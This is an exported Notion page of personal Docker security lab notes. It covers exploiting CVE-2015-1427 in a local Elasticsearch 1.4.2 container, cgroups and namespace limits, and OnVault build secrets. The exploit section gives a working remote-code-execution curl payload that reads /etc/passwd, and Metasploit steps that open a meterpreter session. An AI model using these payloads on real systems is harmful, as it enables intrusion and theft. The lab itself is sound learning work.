{"children":[{"children":[],"uri":"https://www.notion.so/107abe1ee59d4a3e8bf18f603991f79a","type":"text","createdTime":1622650440000,"lastEditedTime":1622650800000,"title":[["This lab was crazy one,  consciously using docker to exploit vulnerability and haha spawning reverse shell in metasploit gives same vibe of first time.\nNote for self: Learn and document exploits in golang using docker.  "]]},{"children":[],"uri":"https://www.notion.so/716d33d4b1264d589cd2b3637a566428","type":"heading","createdTime":1622647680000,"lastEditedTime":1622650440000,"title":[["Hack ElasticSearch Container"]],"depth":2},{"children":[],"uri":"https://www.notion.so/dd24f2bf29064dcb8df1e0969a03f55f","type":"text","createdTime":1622647740000,"lastEditedTime":1622647740000,"title":[["Running applications vulnerable to security exploits can expose your system to hackers. This could result in downtime, data loss or important information disclosure that can have in-reversal impact on a company."]]},{"children":[],"uri":"https://www.notion.so/2012cbc4b68e4e64bd438004f61a9500","type":"heading","createdTime":1622648040000,"lastEditedTime":1622648580000,"title":[["Container Security"]],"depth":3},{"children":[],"uri":"https://www.notion.so/0c6aaff3f42f44389b62149867fc8907","type":"text","createdTime":1622648580000,"lastEditedTime":1622648580000,"title":[["Docker drops certain Linux capabilities and blocks syscalls to add a default level of security."]]},{"children":[],"uri":"https://www.notion.so/4e766cb5ac444771b3ff35fb89e0f82f","type":"code","createdTime":1622648580000,"lastEditedTime":1622650140000,"title":[["# launch container\ndocker run -d -p 9200:9200 --name es benhall/elasticsearch:1.4.2"]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/15dc2f270b5747eb9c403139eb9c5b21","type":"heading","createdTime":1622648640000,"lastEditedTime":1622648640000,"title":[["Exploit Container via CVE-2015-1427"]],"depth":3},{"children":[],"uri":"https://www.notion.so/73ecc759358d40ba9bdb855b166580c4","type":"text","createdTime":1622648640000,"lastEditedTime":1622650020000,"title":[["Exploited Elasticsearch v1.4.2 search future"]]},{"children":[],"uri":"https://www.notion.so/22ff9a8c3f874b16ad1b45338c4d3339","type":"code","createdTime":1622648700000,"lastEditedTime":1622650140000,"title":[["# insert data, cURL to add a record.\ncurl -XPUT 'http://localhost:9200/twitter/user/kimchy1' -d '{\"name\" : \"shay banon\"}"]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/22ef367958f44f5b851f49f1fed9f9bd","type":"text","createdTime":1622648820000,"lastEditedTime":1622650140000,"title":[["Here we using java to execute command to print os name."]]},{"children":[],"uri":"https://www.notion.so/b084b78a46c9427cb6047ec1efffa172","type":"image","createdTime":1622650620000,"lastEditedTime":1622650620000,"source":"https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F331b96d2-e7ee-4a4d-b68a-777a5020b5c6%2FUntitled.png?width=692&table=block&id=b084b78a-46c9-427c-b604-7ec1efffa172","caption":[],"width":692,"height":-1,"fullWidth":false,"pageWidth":true,"aspectRatio":0.21820809248554912,"preserveScale":true},{"children":[],"uri":"https://www.notion.so/930eab64e3b14588800d04c92b214d1c","type":"code","createdTime":1622650620000,"lastEditedTime":1622650860000,"title":[["# to read /etc/passwd\ncurl http://localhost:9200/_search?pretty -XPOST -d '{\"script_fields\": {\"myscript\": {\"script\": \"java.lang.Math.class.forName(\\\"java.lang.Runtime\\\").getRuntime().exec(\\\"cat /etc/passwd\\\").getText()\"}}}'"]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/849c9f21f8924c58845f2d4e457a8e35","type":"image","createdTime":1622791860000,"lastEditedTime":1622791860000,"source":"https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F0e30dfae-cbf8-4c14-9175-7d38caf8e098%2FUntitled.png?width=1251&table=block&id=849c9f21-f892-4c58-845f-2d4e457a8e35","caption":[],"width":1251,"height":-1,"fullWidth":false,"pageWidth":true,"aspectRatio":0.451638689048761,"preserveScale":true},{"children":[],"uri":"https://www.notion.so/db6989bb782e45248e50d435601d561c","type":"bulleted_list","createdTime":1622650860000,"lastEditedTime":1622650920000,"title":[["Docker security gives us huge advantages over running directly on the host."]]},{"children":[],"uri":"https://www.notion.so/cc5fae853b834f9c8e9fbb792c445615","type":"code","createdTime":1622650920000,"lastEditedTime":1622650980000,"title":[["# Run Metasploit\ndocker run -it --link es:es --entrypoint bash benhall/metasploit\n# launch script\nchmod +x start.sh && ./start.sh\n# Under msf\nuse exploit/multi/elasticsearch/search_groovy_script\nset TARGET 0\nset RHOST es\nexploit\n# enjoy meterpreter"]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/e34a155d62ae4939ad74dce7953aa0cb","type":"divider","createdTime":1622791860000,"lastEditedTime":1622791980000},{"children":[],"uri":"https://www.notion.so/1b45135e747444deb11a09b8813f5c10","type":"heading","createdTime":1622791980000,"lastEditedTime":1622791980000,"title":[["CGroups and Namespaces"]],"depth":1},{"children":[],"uri":"https://www.notion.so/272d11646ff0415d884c615644bb91c9","type":"text","createdTime":1622791980000,"lastEditedTime":1622791980000,"title":[["Learning CGroups and Namespces to apply security restrictions to containers."]]},{"children":[],"uri":"https://www.notion.so/794ac4c56e0942d19666393e334de99a","type":"code","createdTime":1622791980000,"lastEditedTime":1622792220000,"title":[["# CGroups Example\n--cpu-shares\n--cpuset-cpus\n--memory-reservation\n--kernel-memory\n--blkio-weight\n--device-read-iops\n--device-write-iops\n\n# Namespaces Example\nCgroup   CLONE_NEWCGROUP Cgroup root dir\nIPC      CLONE_NEWIPC    System V ipc\nNetwork  CLONE_NEWNET    Network device, ports,etc\nMount    CLONE_NEWNS     Mount points\nPID      CLONE_NEWPID    Process IDs\nUser     CLONE_NEWUSER   User and group IDs\nUTS      CLONE_NEWUTS    Hostname and NIS domain name"]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/5dfb470cdd9b4f21968a251d7fc919c6","type":"heading","createdTime":1622792280000,"lastEditedTime":1622988960000,"title":[["Define Memory Limits"]],"depth":2},{"children":[],"uri":"https://www.notion.so/1e0de135bde847bf9d5e603c5d8297a9","type":"text","createdTime":1622988960000,"lastEditedTime":1622989080000,"title":[["It protects system from potentially malicious users or applications aim to perform "],["Denial of System ",[["b",null]]],["applications via resource exhaustion. This limit applications from memory leaks or other programming bugs."]]},{"children":[],"uri":"https://www.notion.so/23af9342c0f44a42aa7ded7e0a5dfabc","type":"code","createdTime":1622989080000,"lastEditedTime":1622989380000,"title":[["# memory usage limits of contianer\ndocker run -d --name mb100 --memory 100mm alpine top\n\n# identify memory usage\ndocker stats --no-stream"]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/9ea39e1ceb384592a6e191a7ece5ecaf","type":"heading","createdTime":1622989380000,"lastEditedTime":1622989380000,"title":[["Define CPU Shares"]],"depth":2},{"children":[],"uri":"https://www.notion.so/29c496a268f74f7b96a88092b7e14fcb","type":"text","createdTime":1622989380000,"lastEditedTime":1622989440000,"title":[["CPU limits are based on shares, shares are weight between how much processing time one process should get compared to another."]]},{"children":[],"uri":"https://www.notion.so/81616a2c7dc1460684bbe694e5e43d32","type":"quote","createdTime":1622989534910,"lastEditedTime":1622989680000,"title":[["One process will use all resources if CPU is idle, if second process comes then CPU will be shared based on weighting."]]},{"children":[],"uri":"https://www.notion.so/5ec5692013af42c18d92433e8722c796","type":"text","createdTime":1622989680000,"lastEditedTime":1623176700000,"title":[["--cpu-shares",[["c",null]]],[" defines share between 0-768"]]},{"children":[],"uri":"https://www.notion.so/71f80c9faf7a45de8c86ac773293ef92","type":"image","createdTime":1623176700000,"lastEditedTime":1623176700000,"source":"https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbf95dfef-069c-457b-bbe9-c9901dc97d27%2FUntitled.png?width=597&table=block&id=71f80c9f-af7a-45de-8c86-ac773293ef92","caption":[],"width":597,"height":-1,"fullWidth":false,"pageWidth":true,"aspectRatio":0.5845896147403685,"preserveScale":true},{"children":[],"uri":"https://www.notion.so/22484e31344c4eff92b2fd1e7bb56663","type":"heading","createdTime":1623176460000,"lastEditedTime":1623176880000,"title":[["Use Network Namespace"]],"depth":2},{"children":[],"uri":"https://www.notion.so/de3e6eb6a0bd4215af50b6ff419fc909","type":"code","createdTime":1623176940000,"lastEditedTime":1623177240000,"title":[["# container are launched, network interface defined and create\n# unique IP addr and interface\ndocker run -it alpine ip addr show\n# process have access to host machine network interface\ndocker run -it --net=host alpine ip addr show\n# If the process listens on ports, they'll be listened on the host interface and mapped to the container."]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/ecf46fc6df22451eac96c0fb1abe8af3","type":"image","createdTime":1623177120000,"lastEditedTime":1623177120000,"source":"https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fed3949de-bc76-4c0c-ae8c-3a99aa09ef16%2FUntitled.png?width=579&table=block&id=ecf46fc6-df22-451e-ac96-c0fb1abe8af3","caption":[],"width":579,"height":-1,"fullWidth":false,"pageWidth":true,"aspectRatio":0.3799654576856649,"preserveScale":true},{"children":[],"uri":"https://www.notion.so/c96e3718b26f48c6a54231863fc91352","type":"divider","createdTime":1623177240000,"lastEditedTime":1623177240000},{"children":[],"uri":"https://www.notion.so/cfc4d67df964401192a7726d5e8cbbb3","type":"heading","createdTime":1623177271675,"lastEditedTime":1623487920000,"title":[["Access .ssh keys during Docker build"]],"depth":1},{"children":[],"uri":"https://www.notion.so/05c9fc524edf41d889529e0812401c4f","type":"code","createdTime":1623487500000,"lastEditedTime":1623487860000,"title":[["# create data to use in build within .ssh\ndocker run -it -v ~/.ssh:/vault/.ssh ubuntu /bin/bash -c \"echo pr0t3ct3d4A$$w0rd > /vault/.ssh/key \"\n# start build secrets server.\ndocker run -d -p 172.18.0.1:14242:3000 -v ~/.ssh:/vault/.ssh dockito/vault\n# run build, here it install onvault client\ncat Dockerfile-onvault\n--\nFROM ubuntu:14.04\nRUN apt-get update -y && \\\n      apt-get install -y curl && \\\n      curl -L $(ip route|awk '/default/{print $3}'):14242/ONVAULT > /usr/local/bin/ONVAULT && \\\n      chmod +x /usr/local/bin/ONVAULT\nENV REV_BREAK_CACHE=1\nRUN ONVAULT echo ENV: && env && echo TOKEN ENV && echo $TOKEN\nRUN ONVAULT ls -lha ~/.ssh/\nRUN ONVAULT cat ~/.ssh/key\n--\n# docker build output and onvault using it\ndocker build -f Dockerfile-onvault -t onvault-test ."]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/b97f4535c9a74f75b24efe785031eaa5","type":"image","createdTime":1623487860000,"lastEditedTime":1623487860000,"source":"https://www.notion.so/signed/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F54b4f9b3-90ea-4162-aa8a-685a7ba71a2d%2FUntitled.png?width=1000&table=block&id=b97f4535-c9a7-4f75-b24e-fe785031eaa5","caption":[],"width":1000,"height":-1,"fullWidth":false,"pageWidth":true,"aspectRatio":0.704,"preserveScale":true},{"children":[],"uri":"https://www.notion.so/c4bc60caddb841d69684a45d76c205ec","type":"code","createdTime":1623487920000,"lastEditedTime":1623487980000,"title":[["# secret automatically removed by OnVault, to check\ndocker run -it onvault-test ls /root/.ssh"]],"language":"Bash","wrap":true},{"children":[],"uri":"https://www.notion.so/756d19b1e0a94be89702c6489344d010","type":"text","createdTime":1623487980000,"lastEditedTime":1623488040000,"title":[["This allows to use secrets as part of our build, but never expose them within the image."]]}],"uri":"https://www.notion.so/431c50b6d4934a12a2e684c1fe57a2ec","type":"page","createdTime":1622487840000,"lastEditedTime":1623488520000,"title":[["Docker Security"]],"icon":"🧭","fullWidth":false,"coverPosition":1,"properties":{"!`\"w":[["Yes"]],"98uZ":[["Hands on ElasticSearch container hacking, Cgroups and Namespace and using Docker OnVault."]],":H`m":[["Yes"]],"{iD?":[["Docker"]],"|Ay0":[["post"]]}}